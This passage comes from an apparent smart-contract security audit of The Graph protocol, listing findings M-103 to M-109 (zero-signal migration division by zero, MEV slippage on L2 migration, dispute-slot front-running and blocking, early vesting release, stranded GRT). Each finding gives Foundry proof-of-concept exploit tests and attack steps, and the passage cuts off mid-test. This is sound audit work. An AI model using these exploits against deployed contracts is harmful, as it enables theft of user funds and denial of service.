    function publishNewVersion(bytes32 newDep) external { require(msg.sender == owner, "auth"); require(!c.isCurated(newDep), "precurated"); if (nSignal != 0) { uint256 tokens = c.burn(dep, vSignal, 0); (vSignal,) = c.mint(newDep, tokens, 0); } dep = newDep; }
}

contract PublishNewVersionPrecurationDoSTest is Test {
    bytes32 constant OLD = keccak256("old");
    bytes32 constant NEW = keccak256("new");
    function testAttackerPrecuratesAndBlocksUpgrade() public { MockCuration c = new MockCuration(); c.seed(OLD, 10000); c.setBps(NEW, 10000); GNSHarness h = new GNSHarness(c, OLD); vm.prank(address(0xBEEF)); c.mint(NEW, 1 ether, 0); vm.expectRevert(bytes("precurated")); h.publishNewVersion(NEW); assertEq(h.dep(), OLD); }
}

## Suggested Mitigation
Do not make upgrade eligibility depend on live public curation state that can be changed between transaction submission and execution. Use a commit/reveal or owner-signed target snapshot, allow the owner to publish to a pre-curated deployment while handling curator-protection with bounded slippage/tax rules, or add a protocol-controlled reservation mechanism for the target deployment before public curation can block it.


## [M-103]. Zero-signal subgraphs cannot be migrated to L2 due to division by zero in L1GNS.sendSubgraphToL2

## id: cEalADCsJqmFziDLjjMdp

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerMath

## Location
L1GNS.sendSubgraphToL2

## Finding Status: Valid
### Finding Status Justification: publishNewSubgraph creates an active subgraph without requiring any signal, so nSignal and vSignal can remain zero. sendSubgraphToL2 is in scope and does not check totalSignal before computing ownerNSignal.mul(curationTokens).div(totalSignal). With totalSignal equal to zero, SafeMath division reverts. There is no zero-signal branch, unlike deprecateSubgraph which skips burn logic when nSignal is zero. The caller must be the subgraph owner, but that is ordinary asset authorization, not trusted protocol privilege. The failure exists in today's code.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
An active subgraph can be published without any curator minting signal, leaving both `nSignal` and `vSignal` equal to zero. `sendSubgraphToL2` does not handle that state and always divides by `totalSignal` after burning curation signal:

```solidity
uint256 ownerNSignal = subgraphData.curatorNSignal[msg.sender];
uint256 totalSignal = subgraphData.nSignal;
uint256 tokensForL2 = ownerNSignal.mul(curationTokens).div(totalSignal);
```

When `totalSignal == 0`, Solidity 0.7 SafeMath division reverts. The subgraph is otherwise active and owned by the caller, so the expected migration should produce a zero-token L2 transfer rather than permanently blocking this lifecycle path.

## Impact
Functional DoS for any active zero-signal subgraph: the owner cannot migrate the subgraph to L2 through `sendSubgraphToL2`, leaving the subgraph stuck on L1 unless signal is later minted or another privileged migration path is used.

## Proof of Concept
1. A user publishes a new subgraph using `publishNewSubgraph` and does not mint any signal.
2. The subgraph remains active, the user owns the SubgraphNFT, and `subgraphTransferredToL2[subgraphID] == false`.
3. The owner calls `sendSubgraphToL2(subgraphID, l2Owner, maxGas, gasPriceBid, maxSubmissionCost)` with the exact ETH fee.
4. `ownerNSignal == 0` and `totalSignal == 0`.
5. The call reaches `ownerNSignal.mul(curationTokens).div(totalSignal)` and reverts with a division-by-zero error.
6. The subgraph is not marked as transferred and cannot be migrated through this function while it has zero signal.

## Proof of Code
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";

contract L1GNSZeroSignalMigrationTest is Test {
    L1GNSHarness gns;
    address owner = address(0xA11CE);
    address l2Owner = address(0xB0B);

    function setUp() public {
        gns = new L1GNSHarness();
        vm.deal(owner, 1 ether);
    }

    function testZeroSignalSubgraphMigrationRevertsOnDivisionByZero() public {
        vm.prank(owner);
        uint256 subgraphID = gns.publishNewSubgraphForTest(owner, bytes32(uint256(1)));

        assertEq(gns.ownerOf(subgraphID), owner);
        assertEq(gns.subgraphSignal(subgraphID), 0);

        vm.prank(owner);
        vm.expectRevert("SafeMath: division by zero");
        gns.sendSubgraphToL2{value: 0}(subgraphID, l2Owner, 0, 0, 0);

        assertEq(gns.subgraphTransferredToL2(subgraphID), false);
        assertEq(gns.subgraphSignal(subgraphID), 0);
        assertEq(gns.ownerOf(subgraphID), owner);
    }
}

contract L1GNSHarness {
    using SafeMath for uint256;

    struct SubgraphData {
        bytes32 subgraphDeploymentID;
        bool disabled;
        uint256 vSignal;
        uint256 nSignal;
        uint256 withdrawableGRT;
        uint32 __DEPRECATED_reserveRatio;
        mapping(address => uint256) curatorNSignal;
    }

    mapping(uint256 => SubgraphData) internal subgraphs;
    mapping(uint256 => bool) public subgraphTransferredToL2;
    mapping(uint256 => address) internal owners;
    uint256 internal nextID = 1;

    function publishNewSubgraphForTest(address owner, bytes32 deploymentID) external returns (uint256) {
        uint256 id = nextID++;
        subgraphs[id].subgraphDeploymentID = deploymentID;
        owners[id] = owner;
        return id;
    }

    function ownerOf(uint256 id) public view returns (address) {
        require(owners[id] != address(0), "ERC721: owner query for nonexistent token");
        return owners[id];
    }

    function subgraphSignal(uint256 id) external view returns (uint256) {
        return subgraphs[id].nSignal;
    }

    function sendSubgraphToL2(uint256 id, address, uint256 maxGas, uint256 gasPriceBid, uint256 maxSubmissionCost) external payable {
        require(!subgraphTransferredToL2[id], "ALREADY_DONE");
        require(msg.value == maxSubmissionCost.add(maxGas.mul(gasPriceBid)), "INVALID_ETH_VALUE");
        SubgraphData storage subgraphData = subgraphs[id];
        require(subgraphData.subgraphDeploymentID != 0 && !subgraphData.disabled, "GNS: Must be active");
        require(ownerOf(id) == msg.sender, "GNS: Must be authorized");
        subgraphTransferredToL2[id] = true;
        uint256 curationTokens = 0;
        subgraphData.disabled = true;
        subgraphData.vSignal = 0;
        uint256 ownerNSignal = subgraphData.curatorNSignal[msg.sender];
        uint256 totalSignal = subgraphData.nSignal;
        uint256 tokensForL2 = ownerNSignal.mul(curationTokens).div(totalSignal);
        subgraphData.curatorNSignal[msg.sender] = 0;
        subgraphData.nSignal = totalSignal.sub(ownerNSignal);
        subgraphData.withdrawableGRT = curationTokens.sub(tokensForL2);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, "SafeMath: addition overflow"); return c; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) return 0; uint256 c = a * b; require(c / a == b, "SafeMath: multiplication overflow"); return c; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a, "SafeMath: subtraction overflow"); return a - b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) { require(b > 0, "SafeMath: division by zero"); return a / b; }
}

## Suggested Mitigation
Handle the zero-signal case explicitly before proportional division. If `totalSignal == 0`, set `tokensForL2 = 0`, `withdrawableGRT = 0`, clear the subgraph state, and continue with the L2 message, or intentionally revert with a documented precondition before any external call. Also skip `curation().burn` when `vSignal == 0` to match `deprecateSubgraph` behavior.


## [H-104]. L1GNS.sendSubgraphToL2 burns all curation signal with minOut=0, allowing MEV to extract migration value

## id: iZX9MsnPKZcfo1sxrLMde

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
L1GNS.sendSubgraphToL2

## Finding Status: Valid
### Finding Status Justification: The in-scope L1GNS.sendSubgraphToL2 function unconditionally calls curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0), then uses the returned curationTokens as the accounting base for tokensForL2 and withdrawableGRT. There is no minimum curationTokens output, owner share minimum, deadline, or price check. For a nonzero-signal subgraph, a public curation market move before execution can reduce the accepted redemption value. The issue does not require a trusted role, compromised key, user-only misuse, or future code changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`sendSubgraphToL2()` converts the entire subgraph curation position into GRT using a hard-coded zero minimum output, then immediately splits the returned amount between the owner bridge transfer and remaining L1 curator withdrawals. Vulnerable snippet: `uint256 curationTokens = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... uint256 tokensForL2 = ownerNSignal.mul(curationTokens).div(totalSignal); ... subgraphData.withdrawableGRT = curationTokens.sub(tokensForL2);`. Because the caller cannot specify a minimum acceptable `curationTokens`, a permissionless trader/searcher can manipulate the underlying Curation market immediately before the owner migration transaction and let the migration settle at a much worse redemption value. The reduced `curationTokens` becomes the canonical accounting base, permanently reducing both the amount bridged for the owner and the withdrawable balance left for non-owner curators.

## Impact
For a heavily curated subgraph, MEV can extract a material portion of the GRT backing during migration. If the subgraph has more than $1M of curation value, the loss can satisfy the program's High smart-contract impact for significant user funds lost or stolen directly from protocol contracts.

## Proof of Concept
1. A valuable subgraph has substantial `vSignal` and `nSignal` in L1GNS. 2. The owner submits `sendSubgraphToL2()` to migrate the subgraph. 3. A permissionless curation trader observes the transaction and front-runs by moving the Curation market so `curation().burn(..., 0)` returns far fewer GRT than the owner/curators expected. 4. L1GNS accepts the manipulated redemption because the min-out argument is hard-coded to zero. 5. L1GNS disables the subgraph, burns the NFT, bridges only the reduced owner share, and records only the reduced residual `withdrawableGRT` for other curators. 6. The attacker back-runs/unwinds the curation trade, keeping the value extracted from the migration slippage.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockCuration {
    uint256 public burnReturn;
    function setBurnReturn(uint256 v) external { burnReturn = v; }
    function burn(bytes32, uint256, uint256 minOut) external view returns (uint256) {
        require(burnReturn >= minOut);
        return burnReturn;
    }
}

contract MockToken {
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract MockGateway {
    uint256 public lastAmount;
    address public lastTo;
    function outboundTransfer(address, address to, uint256 amount, uint256, uint256, bytes calldata) external payable returns (bytes memory) {
        lastTo = to;
        lastAmount = amount;
        return new bytes(0);
    }
}

contract L1GNSLike {
    struct SubgraphData {
        bytes32 deployment;
        uint256 vSignal;
        uint256 nSignal;
        uint256 withdrawableGRT;
        bool disabled;
        mapping(address => uint256) curatorNSignal;
    }

    mapping(uint256 => SubgraphData) internal subgraphs;
    mapping(uint256 => address) public owners;
    mapping(uint256 => bool) public subgraphTransferredToL2;
    MockCuration public curation;
    MockToken public token;
    MockGateway public gateway;
    address public counterpartGNSAddress = address(0xBEEF);

    constructor(MockCuration c, MockToken t, MockGateway g) {
        curation = c;
        token = t;
        gateway = g;
    }

    function seed(uint256 id, address owner, uint256 ownerSig, uint256 totalSig, uint256 vSig) external {
        owners[id] = owner;
        SubgraphData storage s = subgraphs[id];
        s.deployment = bytes32(uint256(1));
        s.curatorNSignal[owner] = ownerSig;
        s.nSignal = totalSig;
        s.vSignal = vSig;
    }

    function sendSubgraphToL2(uint256 id, address l2Owner, uint256 maxGas, uint256 gasPriceBid, uint256 maxSubmissionCost) external payable {
        require(!subgraphTransferredToL2[id]);
        require(msg.value == maxSubmissionCost + maxGas * gasPriceBid);
        SubgraphData storage s = subgraphs[id];
        require(owners[id] == msg.sender);
        subgraphTransferredToL2[id] = true;

        uint256 curationTokens = curation.burn(s.deployment, s.vSignal, 0);
        s.disabled = true;
        s.vSignal = 0;

        uint256 ownerNSignal = s.curatorNSignal[msg.sender];
        uint256 totalSignal = s.nSignal;
        uint256 tokensForL2 = ownerNSignal * curationTokens / totalSignal;

        s.curatorNSignal[msg.sender] = 0;
        s.nSignal = totalSignal - ownerNSignal;
        s.withdrawableGRT = curationTokens - tokensForL2;

        bytes memory extraData = abi.encode(uint8(1), id, l2Owner);
        token.approve(address(gateway), tokensForL2);
        gateway.outboundTransfer{value: msg.value}(address(token), counterpartGNSAddress, tokensForL2, maxGas, gasPriceBid, abi.encode(maxSubmissionCost, extraData));
    }
}

contract L1GNSSlippagePoC is Test {
    function testMigrationAcceptsManipulatedBurnWithNoMinOut() public {
        address owner = address(0xA11CE);
        MockCuration curation = new MockCuration();
        MockToken token = new MockToken();
        MockGateway gateway = new MockGateway();
        L1GNSLike gns = new L1GNSLike(curation, token, gateway);

        gns.seed(1, owner, 500 ether, 1000 ether, 1000 ether);

        uint256 fairCurationTokens = 2_000_000 ether;
        uint256 fairOwnerShare = fairCurationTokens / 2;

        curation.setBurnReturn(1 ether);
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        gns.sendSubgraphToL2{value: 1 ether}(1, address(0xCAFE), 1, 1 ether, 0);

        assertEq(gateway.lastAmount(), 5e17);
        assertGt(fairOwnerShare, gateway.lastAmount());
    }
}

## Suggested Mitigation
Add explicit slippage parameters to migration flows, e.g. `_curationTokensOutMin` and optionally `_tokensForL2Min`, and pass `_curationTokensOutMin` into `curation().burn(...)` instead of zero. Revert if the resulting owner bridge amount or residual withdrawable amount is below caller-provided bounds. The same hard-coded zero-min pattern should be removed from inherited lifecycle flows that burn or remint curation positions.


## [M-105]. Indexing dispute slot can be consumed before valid evidence exists, permanently blocking later disputes

## id: p62u_-6ezJSlPmZHC1TP-

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
Dos

## Location
DisputeManager.createIndexingDispute

## Finding Status: Valid
### Finding Status Justification: createIndexingDispute requires only a deposit, an existing allocation, and positive indexer stake. _createIndexingDisputeWithAllocation keys the sole dispute slot by allocationID, and isDisputeCreated returns true for every non-null terminal status, including Rejected, Drawn, and Accepted. There is no code-level evidence maturity check, closed-allocation check, POI binding, or clearing of rejected premature slots. A permissionless caller can therefore consume the slot before later valid evidence, subject to ordinary arbitrator rejection. This is not shown to be intended, safeguarded, or dependent on privileged abuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`createIndexingDispute()` only checks that an allocation currently exists and then keys the dispute solely by `keccak256(abi.encodePacked(_allocationID))`. `isDisputeCreated()` remains true for every non-null status, including Rejected, Drawn, and Accepted, so a premature or frivolous dispute permanently consumes the allocation's only dispute ID. Vulnerable snippet: `bytes32 disputeID = keccak256(abi.encodePacked(_allocationID)); require(!isDisputeCreated(disputeID), "Dispute already created"); ... require(alloc.indexer != address(0), "Dispute allocation must exist"); ... disputes[disputeID] = Dispute(... Pending);` and `return disputes[_disputeID].status != DisputeStatus.Null;`. There is no on-chain gating that the allocation was closed, that a POI exists, or that the dispute window/evidence is mature before the unique slot is consumed.

## Impact
A malicious indexer or ally can pay the minimum deposit to pre-dispute an allocation, have the bogus dispute rejected, and permanently prevent any later valid indexing dispute for the same allocation. This disables the slashing/challenge mechanism for that allocation and can preserve slashable stake that should have been penalized.

## Proof of Concept
1. Attacker observes an allocation that exists but has not yet produced the disputable invalid POI. 2. Attacker calls `createIndexingDispute(allocationID, minimumDeposit)`. 3. The arbitrator rejects the premature dispute because there is no valid indexing fault yet. 4. The dispute status becomes `Rejected`, but `isDisputeCreated(disputeID)` still returns true forever. 5. When the allocation later has valid evidence of bad indexing, every challenger attempting `createIndexingDispute(allocationID, minimumDeposit)` reverts with `Dispute already created`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract IndexingDisputeHarness {
    enum Status { Null, Pending, Accepted, Rejected, Drawn }
    struct Dispute { address indexer; address fisherman; uint256 deposit; Status status; }
    mapping(bytes32 => Dispute) public disputes;
    mapping(address => address) public allocationIndexer;

    function setAllocation(address allocationID, address indexer) external { allocationIndexer[allocationID] = indexer; }
    function isDisputeCreated(bytes32 disputeID) public view returns (bool) { return disputes[disputeID].status != Status.Null; }

    function createIndexingDispute(address allocationID) external returns (bytes32) {
        bytes32 disputeID = keccak256(abi.encodePacked(allocationID));
        require(!isDisputeCreated(disputeID), "Dispute already created");
        require(allocationIndexer[allocationID] != address(0), "Dispute allocation must exist");
        disputes[disputeID] = Dispute(allocationIndexer[allocationID], msg.sender, 1 ether, Status.Pending);
        return disputeID;
    }

    function reject(bytes32 disputeID) external { require(disputes[disputeID].status == Status.Pending, "not pending"); disputes[disputeID].status = Status.Rejected; }
}

contract PreemptiveIndexingDisputePoC is Test {
    function testRejectedPrematureDisputePermanentlyBlocksAllocation() public {
        IndexingDisputeHarness h = new IndexingDisputeHarness();
        address allocationID = address(0xA11CE);
        address indexer = address(0x1);
        address attacker = address(0xBEEF);
        address honestChallenger = address(0xCAFE);
        h.setAllocation(allocationID, indexer);

        vm.prank(attacker);
        bytes32 disputeID = h.createIndexingDispute(allocationID);
        h.reject(disputeID);
        assertTrue(h.isDisputeCreated(disputeID));

        vm.prank(honestChallenger);
        vm.expectRevert("Dispute already created");
        h.createIndexingDispute(allocationID);
    }
}

## Suggested Mitigation
Do not permanently key indexing disputes only by allocation ID before evidence is mature. Require the allocation to be in a disputable closed state and include the disputed POI/evidence or a canonical dispute nonce in the ID. Alternatively clear or separately track consumed slots so rejected premature disputes do not block future valid disputes.


## [M-106]. Indexing dispute reward can be stolen by frontrunning the allocation dispute slot

## id: eG8JLb2VxlkBf7r8b3cNH

## Derived From Pattern/Invariant
FirstOrLastMoverAdvantage

## Exploit Type
FrontrunMev

## Location
DisputeManager.createIndexingDispute

## Finding Status: Valid
### Finding Status Justification: The indexing dispute flow exposes allocationID in calldata, computes the dispute key only from allocationID, and records the first included msg.sender as fisherman. Later attempts revert because the slot is already created. The code has no commit-reveal, prior commitment, evidence hash binding, or multi-reporter reward logic. A searcher can copy a pending allocation dispute transaction and win the single slot with a higher priority fee. The path is in scoped production code, permissionless, and does not rely on victim misuse or privileged compromise.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Indexing disputes use only the allocationID as the dispute key: bytes32 disputeID = keccak256(abi.encodePacked(_allocationID)); then require(!isDisputeCreated(disputeID), "Dispute already created"). The fisherman recorded for the slot is simply msg.sender. A mempool observer can copy a pending challenger transaction's _allocationID, submit the same dispute first with the required deposit, and permanently occupy the only dispute slot for that allocation. The original challenger's transaction reverts, while the frontrunner becomes the fisherman eligible for any slashing reward.

## Impact
The reward for discovering or submitting an invalid indexing allocation becomes a pure first-inclusion race. Searchers or block builders can steal the fisherman position and associated slashing reward from the evidence holder, creating a gas auction and discouraging honest dispute submission.

## Proof of Concept
1. An honest challenger prepares createIndexingDispute(allocationID, deposit). 2. A mempool observer copies allocationID and sends the same call with a higher priority fee. 3. The observer's transaction is included first and stores disputes[keccak256(allocationID)] with the observer as fisherman. 4. The honest challenger's transaction reverts with Dispute already created. 5. If the arbitrator later accepts the dispute, rewards are paid to the frontrunner instead of the evidence holder.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract VulnerableIndexingDM { struct Dispute { address fisherman; uint256 status; } mapping(bytes32 => Dispute) public disputes; mapping(address => uint256) public rewards; function createIndexingDispute(address allocationID) external returns (bytes32) { bytes32 disputeID = keccak256(abi.encodePacked(allocationID)); require(disputes[disputeID].status == 0, "Dispute already created"); disputes[disputeID] = Dispute(msg.sender, 1); return disputeID; } function accept(bytes32 disputeID) external { require(disputes[disputeID].status == 1, "pending"); disputes[disputeID].status = 2; rewards[disputes[disputeID].fisherman] += 100 ether; } }
contract IndexingDisputeFrontrunTest is Test { function testFrontrunnerCapturesOnlyAllocationDisputeSlot() external { VulnerableIndexingDM dm = new VulnerableIndexingDM(); address allocationID = address(0xA110CA7E); address honest = address(0x100); address searcher = address(0x200); vm.prank(searcher); bytes32 id = dm.createIndexingDispute(allocationID); vm.prank(honest); vm.expectRevert(bytes("Dispute already created")); dm.createIndexingDispute(allocationID); dm.accept(id); assertEq(dm.rewards(searcher), 100 ether); assertEq(dm.rewards(honest), 0); assertGt(dm.rewards(searcher), dm.rewards(honest)); } }

## Suggested Mitigation
Bind dispute creation to a commit-reveal flow or require a challenger-specific signed commitment submitted before the allocationID is revealed. Alternatively, separate reward entitlement from first public calldata inclusion by allowing the original evidence commitment to claim the fisherman role, or by supporting multiple challengers with deterministic reward splitting while preserving only one slash per allocation.


## [M-107]. Truncated period duration lets beneficiaries release locked GRT before endTime

## id: JhZOjmiCqmhtI8rAf45RI

## Derived From Pattern/Invariant
MaturityorGatingByPass / EpochOrIndexMonotonicity

## Exploit Type
RoundingError

## Location
GraphTokenLockManager.createTokenLockWallet

## Finding Status: Valid
### Finding Status Justification: The manager does not validate schedule alignment. GraphTokenLock floors periodDuration, derives currentPeriod from that floored value, and computes availableAmount as passedPeriods times amountPerPeriod before currentTime is greater than endTime. This can make all managed tokens releasable early. The relevant contracts are in scope, and no complete cap or validation exists.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLockManager.createTokenLockWallet forwards arbitrary _periods into GraphTokenLock without validating that the schedule math preserves the configured endTime. In GraphTokenLock, periodDuration() floors duration().div(periods), currentPeriod() divides elapsed time by that floored value, and availableAmount() returns passedPeriods().mul(amountPerPeriod()). For schedules where duration is not aligned with periods, passedPeriods can reach periods while currentTime is still less than endTime, making the whole managed amount releasable early. Vulnerable snippet: createTokenLockWallet(..., uint256 _periods, ...) encodes _periods directly into GraphTokenLockWallet.initialize; GraphTokenLock.periodDuration() returns duration().div(periods); availableAmount() returns passedPeriods().mul(amountPerPeriod()) until current > endTime.

## Impact
A beneficiary of a lock configured with accepted parameters can bypass the intended maturity gate and withdraw locked GRT before the configured endTime, defeating vesting or lockup restrictions. For large token distribution locks this can prematurely release substantial locked balances.

## Proof of Concept
1. The manager creates a wallet with startTime=1000, endTime=1100, periods=60, and managedAmount=60 ether. 2. periodDuration is truncated to 1 second. 3. At timestamp 1060, which is still 40 seconds before endTime, passedPeriods is already 60. 4. availableAmount equals the full managedAmount. 5. The beneficiary calls release() and receives all locked GRT before endTime.

## Proof of Code
pragma solidity ^0.7.6;
import 'forge-std/Test.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '../contracts/GraphTokenLockManager.sol';
import '../contracts/GraphTokenLockWallet.sol';

contract MockERC20 is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { require(balanceOf[msg.sender] >= amount, 'bal'); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { require(balanceOf[from] >= amount, 'bal'); uint256 a = allowance[from][msg.sender]; require(a >= amount, 'allow'); if (a != uint256(-1)) allowance[from][msg.sender] = a - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

contract EarlyReleasePoC is Test {
    MockERC20 token;
    GraphTokenLockWallet master;
    GraphTokenLockManager manager;
    function setUp() public { token = new MockERC20(); master = new GraphTokenLockWallet(); manager = new GraphTokenLockManager(IERC20(address(token)), address(master)); token.mint(address(manager), 1_000_000 ether); }
    function testEarlyFullReleaseBeforeEndTime() public { uint256 managed = 60 ether; uint256 start = 1000; uint256 end = 1100; uint256 periods = 60; bytes memory init = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), address(this), address(this), address(token), managed, start, end, periods, 0, 0, IGraphTokenLock.Revocability.Disabled); address predicted = manager.getDeploymentAddress(keccak256(init), address(master)); manager.createTokenLockWallet(address(this), address(this), managed, start, end, periods, 0, 0, IGraphTokenLock.Revocability.Disabled); GraphTokenLockWallet wallet = GraphTokenLockWallet(predicted); vm.warp(start + 60); assertLt(block.timestamp, end); assertEq(wallet.availableAmount(), managed); wallet.release(); assertEq(token.balanceOf(address(this)), managed); assertEq(token.balanceOf(predicted), 0); }
}

## Suggested Mitigation
Validate schedule parameters at initialization. Require _periods <= _endTime - _startTime, cap passedPeriods to periods, and treat currentTime >= endTime as fully unlocked. Prefer computing availableAmount as min(managedAmount, passedPeriods * amountPerPeriod) with final-period remainder handling.


## [H-108]. GraphTokenLock releases all locked GRT before endTime when duration is not aligned with periods

## id: Kv09RfcoY_LzDQYWDwDrh

## Derived From Pattern/Invariant
MaturityorGatingByPass / EpochOrIndexMonotonicity: vesting periods are not capped after truncating period duration

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.availableAmount / release

## Finding Status: Valid
### Finding Status Justification: GraphTokenLock floors periodDuration and does not cap passedPeriods or availableAmount to less than managedAmount before endTime. For accepted non-aligned schedules, passedPeriods can reach periods before endTime and release can transfer all managed GRT. The code is in scope, and no divisibility validation, elapsed * periods / duration formula, or cap prevents this exact path.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
_initialize() accepts any _periods >= 1 while periodDuration() floors duration() / periods and passedPeriods() is never capped to periods. For schedules where duration is larger than periods but not intended to unlock by periodDuration * periods, passedPeriods can reach periods before endTime, making availableAmount() equal managedAmount early. Vulnerable snippet: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(MIN_PERIOD); availableAmount() returns passedPeriods().mul(amountPerPeriod()) unless currentTime() > endTime.

## Impact
A beneficiary of a misaligned lock can withdraw the full managed GRT balance before the configured endTime, bypassing the vesting/maturity gate. For large token distribution wallets this can prematurely release more than $1M of locked GRT from the lock contract.

## Proof of Concept
1. Create a non-revocable lock with startTime=1000, endTime=1100, periods=60, and managedAmount=60 ether. 2. Because periodDuration is 100 / 60 = 1 second, at timestamp 1060, which is still before endTime, passedPeriods() is already 60. 3. availableAmount() returns 60 ether. 4. The beneficiary calls release() and receives the entire locked balance 40 seconds early.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract MockERC20 { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; uint256 public totalSupply; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(balanceOf[from]>=amount); require(allowance[from][msg.sender]>=amount); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract EarlyReleasePoC is Test { MockERC20 token; GraphTokenLockWallet wallet; address beneficiary=address(0xB0B); function setUp() public { token=new MockERC20(); wallet=new GraphTokenLockWallet(); wallet.initialize(address(this),address(this),beneficiary,address(token),60 ether,1000,1100,60,0,0,IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet),60 ether); } function testEarlyFullReleaseBeforeEndTime() public { vm.warp(1060); assertLt(block.timestamp,1100); assertEq(wallet.availableAmount(),60 ether); vm.prank(beneficiary); wallet.release(); assertEq(token.balanceOf(beneficiary),60 ether); } }

## Suggested Mitigation
Validate schedule parameters during initialization. Require _periods <= _endTime - _startTime and either require duration % periods == 0 or cap passedPeriods() to periods. Also treat currentTime() >= endTime as fully vested and never return more than managedAmount.


## [M-109]. GraphPayments.collect can strand GRT when dataService or receiverDestination is GraphPayments

## id: 4s7e5qtLEM13jNTbwNvJh

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GraphPayments.collect

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 1
## Minimim Privilege Required:Permissionless


## Description
GraphPayments is intended to be a pass-through distributor, but collect() accepts arbitrary payout destinations and does not reject address(this). When dataService == address(GraphPayments), _graphToken().pushTokens(dataService, tokensDataService) performs a self-transfer, so those pulled GRT remain in GraphPayments. Likewise, when receiverDestination == address(GraphPayments), the receiver remainder is self-transferred and remains stuck. The contract has no withdrawal, sweep, or recovery function, so the pass-through invariant is broken.

Vulnerable snippet:

_graphToken().pullTokens(msg.sender, tokens);
...
_graphToken().pushTokens(dataService, tokensDataService);
...
if (receiverDestination == address(0)) {
    _graphToken().approve(address(_graphStaking()), tokensRemaining);
    _graphStaking().stakeTo(receiver, tokensRemaining);
} else {
    _graphToken().pushTokens(receiverDestination, tokensRemaining);
}

## Impact
GRT intended for a data service or receiver can be permanently stranded in GraphPayments. This breaks payment settlement accounting and can cause direct loss of the payer's settled funds for any collection routed with GraphPayments as a payout address.

## Proof of Concept
1. A payer approves GraphPayments to spend GRT. 2. The payer or upstream settlement path calls collect() with dataService set to address(GraphPayments) and a nonzero dataServiceCut, or with receiverDestination set to address(GraphPayments). 3. GraphPayments pulls the full token amount from the payer. 4. The self-transfer succeeds but leaves the corresponding bucket inside GraphPayments. 5. The call emits GraphPaymentCollected as if funds were distributed, while GraphPayments' GRT balance has increased and there is no recovery path.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

interface IGraphTokenMini {
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function approve(address,uint256) external returns (bool);
    function burn(uint256) external;
}

contract MockGRT is IGraphTokenMini {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
    function burn(uint256 amount) external override { balanceOf[msg.sender] -= amount; }
}

contract GraphPaymentsSelfTransferPoC is Test {
    uint256 constant MAX_PPM = 1_000_000;

    MockGRT grt;
    address payer = address(0xA11CE);
    address receiver = address(0xB0B);
    address graphPayments = address(this);

    function setUp() public {
        grt = new MockGRT();
        grt.mint(payer, 1_000 ether);
